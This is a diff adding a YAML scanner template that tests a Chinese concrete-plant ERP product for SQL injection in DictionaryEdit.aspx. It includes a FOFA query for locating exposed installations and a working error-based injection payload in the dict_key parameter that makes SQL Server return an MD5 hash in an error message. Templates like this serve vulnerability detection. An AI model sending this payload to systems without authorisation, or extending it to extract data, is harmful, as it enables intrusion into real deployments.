@@ -1,0 +1,24 @@
+id: poc-yaml-shanghun-erp-dictionaryedit-aspx-sqli
+info:
+  name: 商混ERP系统 DictionaryEdit.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 商混ERP
+  fofa: app="商混ERP系统"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /Sys/DictionaryEdit.aspx?dict_key=1%27%20and%201=convert(varchar(255),sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{.t1}}%27)))--
+  expression: 'status_code == 500 &&
+
+    contains(body,t2) &&
+
+    contains(body,"varchar") &&
+
+    contains(body,"System.Data.SqlClient.SqlException")
+
+    '
+transport: http
